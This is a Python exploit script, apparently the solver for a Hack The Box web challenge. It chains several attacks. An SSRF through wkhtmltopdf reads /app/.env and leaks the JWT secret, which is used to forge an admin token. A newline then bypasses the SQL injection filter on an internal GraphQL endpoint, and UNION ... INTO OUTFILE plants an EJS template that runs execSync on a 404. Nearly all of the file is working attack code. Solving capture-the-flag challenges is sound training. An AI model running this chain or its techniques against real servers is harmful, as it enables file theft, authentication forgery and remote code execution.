#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import os
import re
import secrets
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib

# The /download route renders a URL with wkhtmltopdf, which sends the request
# from the server. That gives an SSRF with file:// and with http://127.0.0.1.
# The leaked .env secret forges an admin JWT. The SSRF then calls /graphql on
# 127.0.0.1, which passes checkInternal. detectSqli only checks the first line
# of the input, so a leading newline lets the SQL injection through. It writes
# an EJS template to errors/404.ejs, and the next 404 runs /readflag.


def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_jwt(secret, role):
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = b64url(json.dumps({"role": role, "iat": int(time.time())}, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url(sig)}"


def pdf_streams(pdf):
    # Yields the decoded body of every stream. Non-Flate streams are yielded as-is.
    for m in re.finditer(rb"\d+ 0 obj(.*?)endobj", pdf, re.S):
        body = m.group(1)
        if b"stream" not in body:
            continue
        start = body.index(b"stream") + len(b"stream")
        start += 2 if body[start:start + 2] == b"\r\n" else 1
        raw = body[start:body.rfind(b"endstream")]
        try:
            raw = zlib.decompressobj().decompress(raw)
        except zlib.error:
            pass
        yield raw


def pdf_text(pdf):
    # wkhtmltopdf embeds the font as glyph IDs, so the text is read through the
    # ToUnicode maps. The glyph IDs of all maps are merged into one table.
    glyphs = {}
    streams = list(pdf_streams(pdf))
    for raw in streams:
        cmap = raw.decode("latin1")
        for section in re.findall(r"beginbfrange(.*?)endbfrange", cmap, re.S):
            for lo, hi, dst in re.findall(r"<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>\s*(\[[^\]]*\]|<[0-9A-Fa-f]+>)", section):
                lo, hi = int(lo, 16), int(hi, 16)
                if dst.startswith("["):
                    for i, v in enumerate(re.findall(r"<([0-9A-Fa-f]+)>", dst)):
                        glyphs[lo + i] = chr(int(v, 16))
                else:
                    base = int(dst[1:-1], 16)
                    for i in range(hi - lo + 1):
                        glyphs[lo + i] = chr(base + i)
        for section in re.findall(r"beginbfchar(.*?)endbfchar", cmap, re.S):
            for src, dst in re.findall(r"<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>", section):
                glyphs[int(src, 16)] = chr(int(dst, 16))

    text = []
    for raw in streams:
        content = raw.decode("latin1")
        if "BT" not in content:
            continue
        # A Td with a vertical move starts a new line. Tj strings are glyph IDs.
        for move in re.finditer(r"(-?[\d.]+) (-?[\d.]+) Td|<([0-9A-Fa-f]+)>\s*Tj", content):
            if move.group(3) is None:
                if float(move.group(2)) != 0:
                    text.append("\n")
                continue
            h = move.group(3)
            text.append("".join(glyphs.get(int(h[i:i + 4], 16), "?") for i in range(0, len(h), 4)))
    return "".join(text)


def request(url, data=None, timeout=60):
    req = urllib.request.Request(url, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read()
    except urllib.error.HTTPError as err:
        return err.read()


def download(base, token, url):
    # The SSRF. wkhtmltopdf fetches url on the server and returns the result as a PDF.
    body = urllib.parse.urlencode({"url": url}).encode()
    return request(f"{base}/download?token={token}", data=body)


def ssti_payload():
    # Runs /readflag and outputs its stdout in the 404 page.
    return "<%- global.process.mainModule.require('child_process').execSync('/readflag').toString() %>"


def write_error_template(base, admin):
    # The name starts with a newline, so detectSqli's ^.*[...] regex never matches
    # the quote. The UNION returns a second column that holds the template bytes.
    # INTO OUTFILE writes the file, and "#" comments out the rest of the LIKE pattern.
    template = "0x" + ssti_payload().encode().hex()
    name = "\n' UNION SELECT 1," + template + ",1,1 INTO OUTFILE '/app/views/errors/404.ejs' #"
    # GraphQL string literals need \n escapes, and the query is URL-encoded for the SSRF URL.
    query = '{ getDataByName(name: "%s") { name } }' % name.replace("\n", "\\n")
    inner = f"http://127.0.0.1:1337/graphql?token={admin}&query={urllib.parse.quote(query, safe='')}"
    return inner


def exploit(host, port):
    base = f"http://{host}:{port}"

    guest = request(f"{base}/getToken").decode().strip()
    print("[*] Guest token acquired")

    # JWT_SECRET skips the file read, for when the SSRF cannot reach a page that
    # loads file:// (see README).
    secret = os.environ.get("JWT_SECRET")
    if not secret:
        pdf = download(base, guest, "file:///app/.env")
        match = re.search(r"secret=(\S+)", pdf_text(pdf))
        if not match:
            raise RuntimeError("secret not found in leaked .env")
        secret = match.group(1)
    print(f"[+] JWT secret: {secret}")

    admin = forge_jwt(secret, "admin")
    print("[*] Admin token forged")

    inner = write_error_template(base, admin)
    download(base, guest, inner)
    print("[*] Error template written to /app/views/errors/404.ejs")

    page = request(f"{base}/{secrets.token_hex(8)}").decode(errors="replace")
    flag = re.search(r"HTB\{[^}]*\}", page)
    if not flag:
        print(page[:500])
        raise RuntimeError("flag not found in 404 response")
    print(f"\n[+] Flag:\n{flag.group(0)}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
